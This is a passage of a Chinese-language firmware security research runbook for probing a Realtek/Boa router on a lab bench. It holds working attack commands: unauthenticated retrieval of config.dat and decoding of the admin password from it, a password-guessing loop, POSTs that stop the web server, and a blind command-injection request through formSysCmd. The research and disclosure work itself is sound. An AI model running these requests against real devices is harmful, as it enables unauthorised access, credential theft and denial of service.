| 它做什麼 | 為什麼 |
|---|---|
| **拒絕**沒帶 `submit-url` 的 `/boafrm/` POST | 那會讓 handler `strcpy("/status.htm")` 寫進唯讀段 |
| **拒絕**參數裡有 shell 元字元 | 注入是 W06 的事，而且要在回復演練之後 |
| **每 5–20 個請求重跑對照組**，而且會重試 | 單一 process 的 `boa` 忙起來跟死掉長得一樣 |
| 端點清單從**committed 的 Ghidra 報告**讀 | 不是寫死的副本，所以不會跟報告漂移 |

#### A3.5.2 五個 group，一次一個

```bash
D="$HOME/fwre-work/dumps"
python3 tools/bench-probe.py control     --host 10.1.1.1
python3 tools/bench-probe.py fingerprint --host 10.1.1.1 -o "$D/fingerprint.json"
python3 tools/bench-probe.py gate        --host 10.1.1.1 -o "$D/gate.json"
python3 tools/bench-probe.py writes      --host 10.1.1.1 -o "$D/writes.json"
python3 tools/bench-probe.py endpoints   --host 10.1.1.1 -o "$D/endpoints-get.json"
python3 tools/bench-probe.py ssdp        --host 10.1.1.1 -o "$D/ssdp.json"
```

| group | 問什麼 | 關掉哪幾項 |
|---|---|---|
| `control` | 裝置回不回應、是不是直連 | —（每一組自己也會跑） |
| `fingerprint` | `Server:` 標頭、404 的形狀、`/boafrm/` vs `/goform/` | `P1-3` `P1-8` |
| `gate` | 授權閘門的實際涵蓋範圍，約 50 種 URI 形狀 | `P2-1` `P2-2` `P2-3` `P2-4` `P2-5` |
| `writes` | 寫入類 handler 有沒有被門特別對待（**GET only**） | `P3-13` |
| `endpoints` | 57 + 3 + 4 個名字（GET 模式） | `P1-5` |
| `ssdp` | UPnP，單播與多播 | `P1-10` |

> ❌ **`-o` 沒給就等於沒做。** 工具會提醒你：
> `(no --output: nothing was recorded. A probe whose response is not kept is not evidence)`

**`control` 的預期輸出：**

```text
   200  control                                  408B  Boa/0.94.14rc21
  route: 10.1.1.1 is directly attached on enxfc19286184c9
```

> ❌ **第二行出現 `⚠ … is reached via …` → 回 `A3.1`。** 那一整組結果會是那條路徑的
> 量測，不是裝置的。

#### A3.5.3 ★ 閘門的四行指紋 —— 記住它們，後面每一個判讀都靠它

```text
不存在的 .htm,不含豁免子字串   302 → login.htm    門跑了,擋掉
不存在的 .htm,含豁免子字串     404                門沒跑,落到檔案層
/boafrm/formX                   302 → home.htm     門沒跑(GET 走不到 handleForm)
/boafrm/formX.htm               302 → login.htm    門跑了
```

**怎麼從 JSON 把它撈出來：**

```bash
python3 - <<'PY'
import json, os
p = os.path.expanduser("~/fwre-work/dumps/gate.json")
for r in json.load(open(p, encoding="utf-8"))["records"]:
    if r.get("probe") != "gate":
        continue
    loc = (r.get("response_headers") or {}).get("Location", "").rsplit("/", 1)[-1]
    print(f'{str(r.get("status")):>4} {r.get("body_bytes",0):>6}B  '
          f'{r.get("target","")[:44]:<44} -> {loc}')
PY
```

**這台的機制（2026-08-17 量到的）：閘門只在 URI 含 `.htm` 或 `.asp` 時才跑，
然後對照一份 11 個字串的豁免清單，而比對是「路徑裡**含有**」——不錨定。**

出貨的 76 個 `.htm` 裡，**7 個未認證可取**：

```text
index · login · status · countDownPage · countDownPageWizard   ← 清單上直接列的
wan_status · Connect_status                                    ← 只因為含有 "status.htm"
```

> ★ **最後兩個不在任何一份清單上，而它們免認證。** 那就是「不錨定」的真正效果 ——
> 不是一個繞過工具，是**一個比程式碼寫出來的名單更大的豁免集合**。

> 🔴 **而它不是繞過，理由比「試了沒用」精確得多：豁免比對和開檔用的是同一個
> 正規化路徑。** 任何裝飾到足以取得豁免的路徑，伺服器都開不到：
>
> ```text
> /password.htm?x=status.htm   302 → login.htm   query 被切掉了
> /password.htm;status.htm     404               豁免生效了,但沒有這個檔
> /login.htm/../password.htm   302 → login.htm   正規化在閘門之前
> ```
>
> **第二行同時證明兩件事：豁免真的生效了，而且繞不過去。**

> 🔴 **測繞過的時候目標必須是真的被擋的頁面。**
> 2026-08-17 第一輪把十三種變形全打在 `/status.htm` 上 —— 而它在豁免清單上、
> **本來就回 200**。那等於拿一扇沒鎖的門測開鎖技巧。
> 這台真的被擋的：`/password.htm`、`/tcpiplan.htm`、`/upload.htm`。

#### A3.5.4 `writes` group：回答一個問題而不執行任何 handler

```bash
python3 - <<'PY'
import collections, json, os
p = os.path.expanduser("~/fwre-work/dumps/writes.json")
d = json.load(open(p, encoding="utf-8"))
print("test names:", d["records"][0]["named_by_P3_13"])
print("counts    :", d["records"][0]["counts"])
t = collections.defaultdict(collections.Counter)
for r in d["records"]:
    if r.get("probe") != "write-endpoint":
        continue
    loc = (r.get("response_headers") or {}).get("Location", "").rsplit("/", 1)[-1]
    t[(r["klass"], r["uri_shape"])][f'{r.get("status")} -> {loc}'] += 1
for k in sorted(t):
    print(k, dict(t[k]))
PY
```

**預期**：

```text
('quiet', 'bare')      {'302 -> home.htm': 22}
('quiet', 'with .htm') {'302 -> login.htm': 22}
('spawns', 'bare')     {'302 -> home.htm': 35}
('spawns', 'with .htm'){'302 -> login.htm': 34, '404 -> ': 1}
```

> ✅ **寫入類與讀取類完全相同 → `P3-13` 的反證條件不成立，預測成立。**

> ★ **那個唯一的 `404` 是 `formLogin.htm`，而它是這一節最漂亮的一格。**
> `formLogin` 也在閘門的豁免清單上，所以路徑含有它就豁免 → 門不跑 →
> 落到檔案層 → 沒有這個檔 → 404。
> **那是閘門模型預測的第 57 個資料點，而它沒有被擬合過。**

> ⚠️ **`quiet` / `spawns` 這個分類是代理指標，工具自己也這樣講。**
> 它分的是「有沒有呼叫 `system()`/`execl()`」，**不是「有沒有寫設定」** ——
> 所以它把 `formPasswordSetup` 判成 `quiet`（它只呼叫 `strcpy`），而那顯然會寫。
> **所以這一組也單獨探測測試自己點名的三個端點**，而且**表裡沒有那三個就拒絕執行**。

#### A3.5.5 `endpoints` 這一組在 GET 模式下分不出東西

**57 個 `root_form[]` 名字的 GET 全部回 `302 / 131B → home.htm`，
和一個不存在的名字無法區分** —— 因為 `translate_uri` 在 `handleForm` 之前就轉走了。

**但有兩個例外，而它們是真的端點：**

```text
formOpdRedirect   302 / 535B → /opmode1.htm
formWanRedirect   302 / 536B
formWlanRedirect2 302 / 131B     ← 與不存在的名字無異
```

> ★ **那兩個回應與其他所有路徑都不同，所以它們被處理了 —— 而 Ghidra 讀出來的
> 57 筆不含它們。** 追下去發現它們由 `init_get`（`0x00407b7c`）處理，不是
> `handleForm`。**所以 `root_form[]` 的 57 不是少，它對 `handleForm` 是完整的；
> 另外有一條更早的路徑。** 而 `formWlanRedirect2` 沒有任何函式引用它 ——
> 字串在 `.rodata` 裡，但是死的。
>
> **三個來源一致：字串在、無人引用、裝置當它不存在。**

**要真正分辨端點存在與否必須 POST，那是 `A3.8`。**

---

### A3.6 🔌 ★ `GET /config.dat` —— 一條四層都指得出來的證據鏈（關 `P10-1` · `P10-2`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3（取檔）+ T2（比對 flash） | **純讀** | [`RUNBOOK` §8.12.15](RUNBOOK.md) | 2026-08-17 |

**先決條件**：`A3.1` 網段；`A2.3` 或 `A2.2` 讀出來的 dump

**這一節是這個專案最值得單獨講的一個結果，而它只有三行命令。**

一個**未認證**的 `GET /config.dat` 拿回 7,490 bytes，而那 7,490 bytes 的 SHA-256
**跟你用 bootloader 從 SPI flash `0xC000` 讀出來的那 7,490 bytes 完全相同**。

#### A3.6.1 取檔（未認證）

```bash
D="$HOME/fwre-work/dumps"
curl -s -D "$D/config-dat.headers" -o "$D/config-dat.bin" http://10.1.1.1/config.dat
head -3 "$D/config-dat.headers"
printf 'bytes: %s\n' "$(stat -c %s "$D/config-dat.bin")"
head -c 6 "$D/config-dat.bin"; echo
```

**預期**：

```text
HTTP/1.1 200 OK
Date: ...
Server: Boa/0.94.14rc21
bytes: 7490
COMPCS
```

> 🔴 **注意這裡沒有任何憑證。** `/config.dat` 的路徑裡沒有 `.htm` 也沒有 `.asp`，
> 所以授權閘門**根本不跑**（`A3.5` 的指紋那四行）。而 `boa` 在**啟動時就建立**這個檔案 ——
> 不需要任何人 POST 任何東西：
>
> ```text
> 401 lseek(3,49152,SEEK_SET) = 49152        <- 0xC000, COMPCS
> 401 read(3,0x490018,7490) = 7490
> 401 open("/web/config.dat",O_RDWR|O_CREAT|O_TRUNC) = 3
> ```
>
> （那三行是 `A1.4` 的模擬環境用 `-strace` 抓到的。）**所以這條鏈比這個 repo
> 原本假設的短一步。**

#### A3.6.2 跟 flash 比，而這一步是整節的重點

```bash
D="$HOME/fwre-work/dumps"
echo "served :  $(sha256sum "$D/config-dat.bin" | cut -c1-32)"
echo "flash  :  $(dd if="$D/flash-n150rt-console-1.bin" bs=1 skip=49152 count=7490 \
                  status=none | sha256sum | cut -c1-32)"
cmp <(dd if="$D/flash-n150rt-console-1.bin" bs=1 skip=49152 count=7490 status=none) \
    "$D/config-dat.bin" && echo "IDENTICAL"
```

**預期**（前 32 個字元一致，而 `cmp` 是真正的判據）：

```text
served :  e09cbf8428aa15944ed75939e79820c5
flash  :  e09cbf8428aa15944ed75939e79820c5
IDENTICAL
```

> 🔴 **`49152` 就是 `0xC000`，而它是十進位** —— `dd` 的 `skip` 不吃 `0x`。
> 這台已經用兩種進位制咬過人一次（`FLR` 的長度十六進位、`DB` 的長度十進位），
> 所以這裡寫成十進位並且把換算寫出來。

> ❌ **`cmp` 說不同 → 停，而且這是好消息不是壞消息。** 兩種可能，都要查清楚：
> （a） 你的 dump 是在改過設定之後讀的，而 `config.dat` 是現況 —— 重讀一次 `A2.3` 的快照；
> （b） 範圍不對 —— `COMPCS` 的長度在 header 裡，不一定是 7,490。
> **不要調整範圍去湊到相同。** 先確認長度從哪裡來。

#### A3.6.3 解出裡面的密碼，然後拿它去認證

```bash
"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs "$D/config-dat.bin" \
    --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
    --disclosure reveal -f md | grep -iE 'USER_NAME|USER_PASSWORD'
```

然後拿那組值去跑 `A3.7` —— **它會通**。

#### A3.6.4 還有沒有別的設定檔拿得到（關 `P10-2`）

**`/config.dat` 不是唯一要問的路徑，而字典不用亂猜** —— 這台的 docroot 是
`flash extr /web` 從 flash 展開的，`webbundle-unit-2018.json` 裡有它全部 143 個檔名。
**所以字典用實際檔名，不是通用清單。**

```bash
python3 - reports/webbundle-unit-2018.json <<'PY' > /tmp/w06-paths.txt
import json, sys
d = json.load(open(sys.argv[1]))
# 兩份清單都要：bundle 的實際檔名證明「只有這些」，常見疑犯證明「連常見的也沒有」。
# 少了後者，一個全 404 的結果什麼都不代表。
extra = ["config.dat", "config.bin", "backup.dat", "romfile.cfg", "cfg.dat",
         "nvram.bin", "settings.dat", "config.dat.bak", "sysconf.dat",
         "COMPCS", "config", "backup_settings.conf", "var/config.dat"]
seen = set()
for e in d["entries"]:
    n = e["name"]
    if n not in seen:
        seen.add(n)
        print(n)
for n in extra:
    if n not in seen:
        print(n)
PY
wc -l < /tmp/w06-paths.txt
```

**預期**：`156`（bundle 的 143 個檔名，加上 13 個不在裡面的疑犯）。

```bash
n=0
while read -r p; do
  n=$((n + 1))
  printf '%s %s\n' "$(curl -s -o /dev/null -w '%{http_code}' -m 5 \
                      "http://10.1.1.1/${p#/}")" "$p"
  if [ $((n % 40)) -eq 0 ]; then
    curl -sf -m 5 -o /dev/null http://10.1.1.1/ && echo "--- control $n: server alive"
  fi
done < /tmp/w06-paths.txt | tee "$HOME/fwre-work/dumps/w06-config-paths.txt"
sort "$HOME/fwre-work/dumps/w06-config-paths.txt" | awk '{print $1}' | uniq -c
```

**預期 —— 而這一輪的重點是那 13 個疑犯，不是那 143 個檔名：**

```text
200 config.dat
404 config.bin
404 backup.dat
...
--- control 40: server alive
```

**`config.dat` 是 13 個疑犯裡唯一回 200 的**，而它**不在 bundle 的 143 個檔名裡**
——`boa` 啟動時自己建的（`A3.6.1` 那三行 `strace`）。**其餘 12 個一個都不該存在。**

bundle 那 143 個的分佈是 `A3.5` 閘門模型的複驗：`.htm` 多數 `302`（69 個被擋、7 個放行），
非 `.htm`（`.js` / `.css` / `.gif`）一律 `200` —— **因為閘門看的是路徑裡有沒有 `htm`。**

> ❌ **那 12 個疑犯裡任何一個回 200 → 停下來。** 那代表 docroot 不只是
> `flash extr /web` 展開的內容，而 `P1-3`、`P3-10`、`P3-11` 三項的預測都建立在
> 「docroot 就是那 143 個檔」上面。**先把那個檔是誰放的查清楚。**

> ⚠️ **這一輪是純 GET，但它有 150 次以上的請求。** `A3.8` 量到這台的 web server
> 是單行程、而且一個畸形 POST 就能佔住它 4–10 秒。GET 沒有那個問題（`A3.5` 打了
> 76 個頁面沒事），但**每 40 個請求回頭 `curl -sf http://10.1.1.1/ ` 確認一次**，
> 否則後面整串 000 你分不出是「檔案不在」還是「server 不在」。

#### 為什麼這一節值得單獨存在

**這條鏈的每一環都能單獨指出來，而且用的是不同的儀器：**

| 環 | 誰量的 | 走哪條路 |
|---|---|---|
| HTTP 回應 7,490 bytes | `curl` | 乙太網路 |
| flash `0xC000` 起 7,490 bytes | bootloader 的 `FLR` + `DB` | 序列埠 |
| 那份 blob 裡的 `USER_PASSWORD` | `fwrecon compcs` | LZSS 解碼 + `libapmib` 的 checksum |
| 那組明文通過認證 | `curl -u` | 乙太網路 |

> ★ **而第二環順手關掉一個從 W02 就開著的缺口。** W02 說「沒有第二個獨立儀器讀過
> 這顆 flash」——每一個 byte 都是經 bootloader 的 `FLR` 來的，所以一個系統性錯誤的
> `FLR` 會是隱形的。
>
> 這一節裡，`boa` 經 **kernel 的 MTD 驅動**、走**乙太網路**讀了同一塊區域；
> W02 經 **bootloader 的 SPI 常式**、走 **UART**。
> **兩條不共用任何程式碼的路徑，同一組 bytes。**
> 那是**佐證（corroboration）**，不是**重複（repeatability）** —— 而那一欄從
> 2026-08-16 起一直是空的。**範圍是 `0xC000`–`0xD142`，不是整顆晶片。**

> ⚠️ **這是 CVE-2019-19822（未認證設定外洩）加 CVE-2019-19823（明文儲存），
> 兩個都是 2019 年公開的。** 這一節重現的是已公開的東西，不是新發現 ——
> 這個專案自己的部分是**那條佐證鏈**，不是那個漏洞。

---

### A3.7 🔌 憑證與 session —— 兩個來源位址（關 `P2-7` · `P2-8`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **純讀。**登入一次不寫任何東西（這個 build 沒有 session 可寫） | [`RUNBOOK` §8.12.16](RUNBOOK.md) | 2026-08-17 |

**先決條件**：`A3.1` 的網段已設好；密碼已從 flash 解出來

**密碼不是猜的，是從你自己的 flash 解出來的** ——
`USER_NAME` / `USER_PASSWORD`，明文，兩個獨立來源（`fwrecon compcs`，以及廠商自己的
`flash get`）。所以登入成功是**在自己的機器上把 CVE-2019-19823 端到端走完**。

```bash
# 從你的快照解出憑證。--disclosure protect 會遮掉,要看明文才加 reveal
"$HOME/fwre-work/venv/bin/python" -m fwrecon compcs \
    "$HOME/fwre-work/dumps/flash-n150rt-console-1.bin" --offset 0xC000 \
    --mib "$HOME/fwre-work/extracted/unit-2018/squashfs-root/lib/libapmib.so" \
    --disclosure reveal -f md | grep -iE 'USER_NAME|USER_PASSWORD'
```

**不帶憑證 / 帶憑證 / 帶錯的，三個一起打，才有對照組：**

```bash
U=admin; P=admin      # 換成上面解出來的
for label in none good bad; do
  case "$label" in
    none) A=() ;;
    good) A=(-u "$U:$P") ;;
    bad)  A=(-u "$U:wrongpassword") ;;
  esac
  printf '%-5s ' "$label"
  curl -s -o /dev/null -D- -m 6 "${A[@]}" http://10.1.1.1/password.htm \
    | awk '/^HTTP|^Location|^Set-Cookie/{printf "%s | ", $0}'
  echo
done
```

**預期**：

```text
none  HTTP/1.1 302 Found | Location: http://10.1.1.1/login.htm |
good  HTTP/1.1 200 OK |
bad   HTTP/1.1 302 Found | Location: http://10.1.1.1/login.htm |
```

> 🔴 **`Set-Cookie` 一行都不會出現，而那是這一測最重要的輸出。**
> 這個 build **沒有 session**：授權是每一個請求各自的 HTTP Basic。
> 不是 2015 的 `AUTHG_IP_ADDR`、不是 2020 的五格表、**也不是反組譯指到的那個全域**。

**session 模型 —— 用第二個來源位址，而這一測不必再讀一行組語：**

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
sudo ip addr add 10.1.1.101/24 dev "$IF" 2>/dev/null
# 1) .100 帶憑證成功  2) 之後 .100 不帶憑證  3) .101 帶憑證
for src in 10.1.1.100 10.1.1.101; do
  printf '%s with    ' "$src"
  curl -s -o /dev/null -w '%{http_code}\n' -m 6 --interface "$src" \
       -u "$U:$P" http://10.1.1.1/password.htm
  printf '%s without ' "$src"
  curl -s -o /dev/null -w '%{http_code}\n' -m 6 --interface "$src" \
       http://10.1.1.1/password.htm
done
```

**預期 —— 成功之後同一個位址不帶憑證仍然被擋，那就是「沒有 session」的證據：**

```text
10.1.1.100 with    200
10.1.1.100 without 302
10.1.1.101 with    200
10.1.1.101 without 302
```

**沒有帳號鎖定 —— 這一項要真的跑完，不要跑三次就下結論：**

```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -m 6 -u "$U:wrong$i" http://10.1.1.1/password.htm
done
printf 'after 50 wrong, the 51st correct one: '
curl -s -o /dev/null -w '%{http_code}\n' -m 6 -u "$U:$P" http://10.1.1.1/password.htm
```

**預期**：`200`。**五十次錯誤之後第五十一次正確的仍然通** = 沒有計數器、沒有鎖定。

> ⚠️ **「沒有 session」不等於「沒有 CSRF」。** 瀏覽器會自動重送快取的 Basic 憑證，
> 所以跨站面是靠另一個機制活著的。這是推論，不是這一測量到的東西。

> ❌ **`good` 那一行不是 200 → 停，不要重試。** 要嘛解碼器錯了，要嘛這台被改過密碼。
> 回去查 `fwrecon compcs` 的輸出，不要在裝置上試別的密碼。

---

### A3.8 🔌 POST 輪 —— **這一節會改變裝置的設定**（關 `P1-4` · `P1-5` · `P1-6`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **改設定。而且它已經兩次把 web server 弄掉。** | [`RUNBOOK` §8.12.12](RUNBOOK.md) | 2026-08-17（跑兩次，兩次都在第 45 個附近把 `boa` 弄掉） |

**先決條件**：**`A2.3` 的快照必須已經抓好**；`A3.5` 已經跑過（GET 那半邊先做）

> ## 🔴 跑之前把這一整節讀完
>
> **POST 到 form handler 就是執行它。** 而參數全部缺席的 handler **不會什麼都不做** ——
> accessor 會回它的預設值，而 handler 把那個預設值寫進去。
>
> 這一節做完你會有：57 個端點的存在性答案、W05 DoD 最後一格、
> **以及一個未認證的可用性缺陷的量測**。代價是這台的設定會變，而那是計畫內的。

#### A3.8.1 為什麼有 13 個端點不會被打

```bash
python3 - <<'PY'
import importlib.util, pathlib
spec = importlib.util.spec_from_file_location("bp", pathlib.Path("tools/bench-probe.py"))
bp = importlib.util.module_from_spec(spec); spec.loader.exec_module(bp)
for name, why in sorted(bp.HAZARDOUS.items()):
    print(f"  {name:<22} {why}")
PY
```

**四種最壞情況，而第一種最陰險：**

| handler | 打下去會怎樣 |
|---|---|
| `formTcpipSetup` / `formWanTcpipSetup` / `formVlan` | **LAN 位址或 VLAN 被改 → 掃到一半失去這台**，而後面每個端點都回「連不上」，看起來跟「端點不存在」一模一樣 —— **正是這支工具當初為了 `submit-url` 而生的那個失效模式，換一件衣服** |
| `formPasswordSetup` | 管理密碼被改 → **`A3.6` 和 `A3.7` 的 CVE-2019-19823 端到端鏈當場毀掉**，而那是這個專案最硬的一條證據 |
| `formUpload` / `formUploadConfig` | 韌體 / 設定上傳路徑。`boa` 裡有 `DownloadRFW` —— **這是會磚的那一類** |
| `formOpMode*` / `formWizard` / `formReboot*` | 運作模式變更，多半接重開機 |

> ⚠️ **設定被改是可以歸因也可以還原的；失去 LAN 位址、失去密碼、進入韌體上傳路徑不是。**
> 那是這份清單的分界線，不是「危險程度」。

> 💡 **真的要打其中一個，要第二個旗標 `--allow-destructive`，而它會被記進 transcript。**
> 「我接受設定會變」和「請把 LAN 位址從我手上拿走」是兩個不同的同意。

#### A3.8.2 打

```bash
python3 tools/bench-probe.py endpoints --host 10.1.1.1 --allow-post \
        -o "$HOME/fwre-work/dumps/endpoints-post.json"
```

**第一行輸出就是拒絕清單 —— 它出現在任何結果之前，是刻意的：**

```text
  note  13 of 64 endpoints will not be POSTed: formTcpipSetup, formPasswordSetup,
        formUpload, formVlan, formWanTcpipSetup, formOpMode, formOpMode1,
        formOpMode2, formWizard, formRebootCheck, formSaveConfig,
        formUploadConfig, formRebootSchedule
```

> 🔴 **一份覆蓋 44 / 57 而不說的掃描，讀起來就像一份完整的普查。**
> 所以名字和數量寫在第一筆紀錄裡，讀者先遇到缺口，才遇到結論。

**每一個 POST 之後，工具會等到伺服器再度回應，並把等待時間記成那個端點的停滯時長。**
那不是繞過障礙，**那就是量測**。

**已知會發生的事（2026-08-17 兩次一致）：**

```text
送出 POST 34–36 個   有回應 31–32   零個 404
狀態碼: 200 ×4 · 302 ×27–28
302 去向: msg.htm ×13 · status.htm ×11–12 · countDownPage.htm ×2 · login.htm ×1
最慢: formPortFw 9650ms · formPocketWizard 6359ms
      formWlanSetup / formRoute / formSysLog 各 ~6008ms
約第 45 個之後 -> control failed ... ConnectionRefusedError
```

#### A3.8.3 ★ 那個 `ConnectionRefusedError` 不是掃描失敗，是結果

> 🔴 **不帶任何參數的未認證 POST，佔住這台唯一的 web server 4.7–9.7 秒。**
> `boa` 在這台是**單一 process**（`boa: starting server pid=350, port 80`），
> handler 呼叫 `system()` / `execl()` 期間它不回到 accept 迴圈，
> backlog 滿了之後新連線被**拒絕**。
>
> 約 45 個連續請求讓它徹底停止服務，**兩次都是**。而且：
>
> - `ping` **全程正常** —— kernel 活著，只有 `boa` 不見了
> - console **一行訊息都沒有** —— 沒有 oops，什麼都沒有
> - **20 分鐘後 `boa` 仍然沒有回來** —— `rcS` 是一次性啟動它的，不是 respawn
>
> **斷電重開即復原。**

> ⚠️ **這與 `P4-1` 不是同一條。** `P4-1` 是**不帶** `submit-url`、往唯讀段 `strcpy`；
> 這一條**帶**了 `submit-url`，是一個完全合法的請求。
> **分類與影響評估留給 W06/W07**,`docs/disclosure.md` 的 `D-9` 記了一筆。

**中止之後 transcript 仍然會寫出來**（2026-08-17 之前不會 —— 儀器 bug 20），
而它會印出最慢的五個請求：

```text
wrote .../endpoints-post.json  (46 requests, run STOPPED)

  slowest requests before the stop:
       9650 ms  POST /boafrm/formPortFw
       6359 ms  POST /boafrm/formPocketWizard
```

#### A3.8.4 ★ `formSysCmd` 答了，而且可證明它沒有執行任何東西

```bash
python3 - <<'PY'
import json, os
p = os.path.expanduser("~/fwre-work/dumps/endpoints-post.json")
for r in json.load(open(p, encoding="utf-8"))["journal"]:
    if r["method"] == "POST" and r["target"].endswith("formSysCmd"):
        loc = (r.get("response_headers") or {}).get("Location", "")
        print(f'{r["status"]}  {r["elapsed_ms"]}ms  -> {loc}')
PY
```

**預期**：

```text
302  10ms  -> http://10.1.1.1/status.htm
```

**這一格關掉 W05 DoD 的最後一項（W06 目標的「可達性已知」），而且它什麼都沒執行 ——
那不是我的保證，是 handler 自己的程式碼：**

```c
cmd = req_get_cstream_var(req, "sysCmd", "");
if (*cmd != '\0') {              /* <- sysCmd 缺席,所以這裡是 false */
    snprintf(buf, 100, "%s 2>&1 > %s", cmd, "/tmp/syscmd.log");
    system(buf);                 /* <- 根本沒被呼叫 */
}
send_redirect_perm(req, submit_url);
```

> 🔴 **「可達性」和「概念驗證」是兩件事，而把它們混為一談會讓 DoD 因為一個
> 不存在的理由開著。** 一個不帶 `sysCmd` 的 POST 證明端點可達且未認證；
> 一個**帶命令**的 POST 才是 PoC —— 那是 `P3-3`，W06 的，而且要在
> `docs/disclosure.md` 說明狀態之後。

#### A3.8.5 收尾：再抓一份快照，然後歸因

```bash
# 1) 回 A2.2 搶 bootloader（要斷電重開），然後：
SNAP2="$HOME/fwre-work/dumps/config-region-$(date +%Y%m%d-%H%M)-post.bin"
python3 -u tools/console-dump.py dump --at-prompt \
        --flash 0x0 --length 0x10000 --ram 0x81000000 --chunk 16384 -o "$SNAP2"
# 2) 逐欄位歸因
bash tools/config-attrib.sh "$HOME/fwre-work/dumps/"*-pre.bin "$SNAP2"
```

**預期 —— 而 2026-08-17 的答案有一半不在任何人的預測裡：**

```text
raw: 14068 of 65536 bytes differ

  0x00000-0x06000  boot loader                                  UNCHANGED
  0x06000-0x08000  H601   hardware MIB (MAC + radio calibration) UNCHANGED
  0x08000-0x0c000  COMPDS factory defaults                      7105 bytes
  0x0c000-0x10000  COMPCS live configuration                    6963 bytes

  COMPCS (live)    : 19 fields
  COMPDS (defaults): 23 fields
  only in COMPDS   : ['CHECK_SSID_OK', 'DHCP_LEASE_TIME', 'MIB_VER', 'WLAN_SSIDS']
```

> 🔴 **`COMPDS` 動了，而它是出廠預設區。** 那 23 欄 = 同樣的 19 欄
> **加上原本區分兩區的 4 欄，而且每一欄都移到 `COMPCS` 的值**。
> 兩區現在 343 個共同欄位完全相同。
>
> **所以：一次未認證的設定寫入，同時把出廠預設區覆蓋掉。**
> 在這個 build 上，**「恢復原廠設定」還原的是最後被寫進去的那一份** ——
> reset 按鈕不是復原路徑。唯一的復原是從裝置外的副本重寫（`A2.5`）。

> ✅ **`H601` UNCHANGED 是這裡最重要的一行。** 那是這一台的 MAC 與射頻校準，
> 全世界只有這一份，而且 reset 不還原它。**每一次歸因都先看那一行。**

> ⚠️ **沒有一個危險旗標被打開**（2026-08-17）：`SSH_ENABLED`、`UPNP_ENABLED`、
> `PING_WAN_ACCESS_ENABLED` 和三個 `VPN_PASSTHRU_*` 全部 1 → 0。
> **但 `NOTICE_ENABLED` 變成 208** —— 一個布林欄位裝了 208,
> 代表某個 handler 把它 accessor 對「參數缺席」回的值寫了進去，而那既不是 0 也不是 1。
> **那是一條線索，不是結論。**

---

### A3.9 🔌 ★ 未認證命令注入 —— 三個標的、三種 oracle（關 `P3-3` · `P3-1` · `P3-2` · `P3-4` · `P3-7` · `P5-5`）

| 層 | 動到裝置 | 為什麼這一節存在 | 最後驗證 |
|---|---|---|---|
| T3 | **A1 的第一發是零副作用；之後會寫 `/var`（ramfs），`A3.10` 才寫 flash** | [`RUNBOOK` §8.12.18](RUNBOOK.md) | 2026-08-17 夜（`P3-3` 成立；`P3-1` 與 `P3-2` 反證） |

**先決條件**：`A3.1` 網段；`A2.3` 的前置快照已抓；[`docs/disclosure.md`](docs/disclosure.md)
已寫明本節每個標的的狀態；主機端 `tcpdump` 已在跑

#### A3.9.0 順序是 ICMP → docroot → flash，而順序本身是方法

**這個漏洞是盲注：`system()` 的輸出不會進 HTTP 回應。**
`formSysCmd` 的組字串在 binary 裡是 `%s 2>&1 > %s` —— 你送的命令在**前面**，
後面接著把 stdout 導去 `/tmp/syscmd.log`。所以「看回應有沒有 `uid=0`」在這台上
**永遠不會發生**，而 W06 的整個設計就是繞開那件事。

| oracle | 副作用 | 它證明什麼 |
|---|---|---|
| **ICMP** | **零**。不寫任何儲存 | 命令執行了 |
| **docroot 回寫** | 寫 `/var/web`，而 `/var` 是 ramfs（`rcS` 第 10 行 `mount -t ramfs`），**重開就沒了** | 命令的**輸出**拿得回來 |
| **flash 差異**（`A3.10`） | 寫非揮發性儲存 | 命令改了矽晶片上的 byte |

> 🔴 **先用零副作用的確認注入成立，再用有副作用的取最強證據。**
> 反過來做，第一發就寫壞了的話，你連「注入到底成不成立」都不知道。

#### A3.9.1 對照組：先證明你抓得到 ICMP

```bash
IF="$(ip -br link | awk '/^enx/{print $1; exit}')"
sudo tcpdump -ni "$IF" -w "$HOME/fwre-work/dumps/w06-icmp.pcap" icmp &
sleep 2
ping -c 2 10.1.1.1
sudo pkill -x tcpdump ; sleep 1
tshark -r "$HOME/fwre-work/dumps/w06-icmp.pcap" -T fields -e ip.src -e ip.dst -e icmp.type
```

**預期**：四列，`10.1.1.100 → 10.1.1.1` type 8 與 `10.1.1.1 → 10.1.1.100` type 0 各兩筆。

> ⚠️ **`$IF` 用推導的，不要寫死。** 這個 repo 因為寫死 `eth1` 被咬過一次
> （W05，儀器 bug 21 那一串）：介面名在不同機器上不一樣，而抓不到封包跟
> 「命令沒執行」在輸出上完全一樣。

> ⚠️ **`pkill -x tcpdump` 不要寫成 `pkill -f 'tcpdump -ni ...'`。**
> `-f` 比對整條命令列，而**呼叫它的那個 shell 的命令列裡就有那個字串**，
> 於是它把自己殺掉，回一個沒有其他線索的 exit 15。2026-08-17 實地踩過。

> ❌ **抓不到 → 停，先修抓包。** 之後注入那一發沒有封包時，你必須能區分
> 「命令沒執行」和「我沒在聽」。**先把後者排除掉，這一節才有判別力。**
> `eth1` 這個名字**不要假設** —— 用 `A3.1` 量出來的那個介面名。

#### A3.9.2 ★ A1：`formSysCmd`，ICMP oracle，**不帶任何憑證**（關 `P3-3`）

```bash
sudo tcpdump -ni "$IF" -w "$HOME/fwre-work/dumps/w06-p33.pcap" icmp &
sleep 2
curl -s -o /dev/null -w 'HTTP %{http_code}  %{time_total}s\n' \
  -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=ping -c 3 10.1.1.100' \
  --data 'submit-url=/syscmd.htm'
sleep 4
sudo pkill -x tcpdump ; sleep 1
tshark -r "$HOME/fwre-work/dumps/w06-p33.pcap" -T fields -e ip.src -e ip.dst -e icmp.type
```

**預期**：

```text
HTTP 302  0.012s
10.1.1.1	10.1.1.100	8
10.1.1.1	10.1.1.100	8
10.1.1.1	10.1.1.100	8
```

> 🔴 **判據是「來源是 `10.1.1.1` 的 type 8」** —— 也就是**路由器主動發出**的 echo
> **request**。`A3.9.1` 對照組裡路由器送的是 type 0（reply）。
